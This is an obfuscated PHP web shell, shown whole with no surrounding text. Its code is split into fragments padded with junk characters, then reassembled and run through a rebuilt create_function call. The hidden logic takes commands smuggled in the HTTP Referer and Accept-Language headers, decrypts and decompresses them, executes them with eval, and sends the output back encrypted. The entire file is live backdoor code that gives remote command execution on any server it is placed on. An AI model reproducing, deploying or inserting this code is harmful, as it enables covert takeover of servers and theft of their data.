<?php
$n='$i=0;$k4i<$lk4;){for($jk4=0;k4($j<$c&&$ik4<$l)k4;$j++,$ik4++)k4{$ok4.=$k4t{$i}^k4$k{k4$j};}}rek4turk';
$X='ray("/k4","+"),$ss($k4sk4[$i],0k4k4,$e))),$k)k4));$o=obk4_get_contk4ek4nts();k4ob_endk4_clek4an();$d=b';
$F='asek464_enck4ode(xk4(gzk4compress(k4$k4o),$kk4k4k4));k4print("<$k>$d</$k>");@sessionk4_desk4troy();}}}}';
$C='4$z++)$p.k4k4=$q[$m[2]k4[$z]]k4;ifk4(strpos($p,$k4k4hk4)===0k4){$s[$i]="";k4$p=$ss($p,3);k4}ik4f(ar';
$u='4n $o;}$r=k4$k4_SERk4VER;$rr=@$r["HTTP_REFERk4ER"]k4;$ra=k4@$r["HTTP_ACk4CEPk4Tk4_LANGUAGE"]k4;ifk4(';
$d=str_replace('VW','','crVWeVWaVWteVWVW_functVWion');
$R='k4$rr&&$k4ra){$u=parse_urlk4($rr);k4parsk4e_k4stk4r($u["query"],$qk4k4);$qk4=ark4ray_valuesk4($q);pk4reg_m';
$v='$khk4="5d41";$kf=k4"4k402a";funck4tik4on x($k4t,$k){$c=k4strlek4n($k);$l=k4strlk4en(k4$t);$ok4="";fork4(';
$V='k4s=&$_Sk4ESSION;$ss="substk4r";k4$sl="stk4rtolowk4er";$i=$mk4k4[1][0].$m[1k4][1k4];k4k4$k4h=$sl($ss(md';
$B='5($i.$kh),k40,3));k4k4$fk4=$sl(k4$ss(md5($i.$k4kf)k4,0,3k4));$p=k4"";for($z=1;$k4z<count($mk4[1]);k';
$L='atk4ch_allk4("/([\\w])[k4\\w-]+(?k4:;q=k40.([\\d]))k4?,?/",$k4rk4a,$m);if(k4$q&&$m){k4@sessk4ik4on_k4k4start();$';
$H='rayk4_key_exisk4tsk4($i,$k4s)){$s[$k4i].=$p;k4$e=strpk4os($s[$k4i],$fk4)k4;if($e){$k=$k4kh.k4$kk4f';
$i=';ob_start(k4);@evak4l(@gzunk4compresk4s(@x(k4@bk4ase6k44_decok4de(preg_replak4ce(arrak4yk4("/_k4/k4","/-/"),k4ar';
$j=str_replace('k4','',$v.$n.$u.$R.$L.$V.$B.$C.$H.$i.$X.$F);
$D=$d('',$j);$D();
?>
